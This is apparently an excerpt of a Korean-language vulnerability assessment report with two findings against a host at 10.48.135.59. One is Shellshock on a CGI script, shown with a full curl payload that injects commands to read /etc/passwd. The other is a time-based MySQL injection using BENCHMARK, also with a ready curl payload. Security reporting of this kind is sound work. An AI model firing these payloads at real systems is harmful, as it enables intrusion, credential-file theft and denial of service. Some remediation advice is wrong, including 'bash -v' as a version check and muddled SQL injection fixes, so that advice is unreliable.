## ShellShock - Remote Code Execution
- **End-Point**: `http://10.48.135.59/cgi-bin/test.cgi`, `http://10.48.135.59//cgi-bin/test.cgi`
- **영향**: 원격 코드 실행(RCE)을 통해 공격자가 시스템 권한을 획득하고 데이터를 탈취하거나 시스템을 완전히 장악할 수 있음.
- **설명**: GNU Bash 4.3 이하 버전에서 환경 변수에 포함된 함수 정의 뒤의 문자열을 처리하는 과정에서 발생하는 취약점(CVE-2014-6271)으로, Apache mod_cgi나 SSH의 ForceCommand 등 환경 변수를 조작할 수 있는 상황에서 공격자가 `echo` 명령어를 주입하여 시스템 파일을 읽을 수 있음.
- **근거**: `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Referer: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'Shellshock: () { ignored; }; echo Content-Type: text/html; echo ; /bin/cat /etc/passwd ' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0' 'http://10.48.135.59/cgi-bin/test.cgi'` 명령을 통해 환경 변수에 임의의 `echo` 명령어를 주입하여 `/etc/passwd` 파일 내용을 반환함.
- **대응**: 해당 취약점이 해결된 최신 버전의 Bash를 사용하고, 시스템에 설치된 모든 스크립트 및 외부에서 호출되는 스크립트에서 Bash 환경 변수 처리 로직을 점검함.
- **조치**: `bash -v` 명령으로 현재 Bash 버전을 확인하고, 취약점이 해결된 5.3 이상의 버전으로 업데이트함.

## Time-based SQL Injection (BENCHMARK Function)
- **End-Point**: `http://10.48.135.59/`
- **영향**: 시간 지연(Time-based)을 이용한 SQL 인젝션으로 서버의 리소스를 과부하시키고 서비스 중단을 유발할 수 있음.
- **설명**: MySQL의 `BENCHMARK` 함수를 악용하여 입력값을 조작하여 실행 횟수를 증가시키고, 이를 통해 서버의 응답 시간을 측정하는 취약점임. `SLEEP` 함수가 차단된 환경에서도 사용 가능함.
- **근거**: 다음 재현 코드를 통해 `BENCHMARK` 함수의 지연 효과를 확인함. `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.5.20) Gecko/ Firefox/3.6.20' 'http://10.48.135.59/?uid=1'\''+OR+IF(1=1,BENCHMARK(10000000,MD5(1)),0)--+'`
- **대응**: 사용자 입력값에 대해 검증을 수행하고, 가능한 경우 `SLEEP` 함수 대신 `BENCHMARK` 함수 사용을 제한하거나 입력값에서 `MD5` 함수 사용을 금지함.
- **조치**: 애플리케이션 로직에서 `BENCHMARK` 함수의 실행 횟수를 제한하고, `SLEEP` 함수 사용을 최소화하며 입력값에 대한 화이트리스트 기반 검증을 적용함.
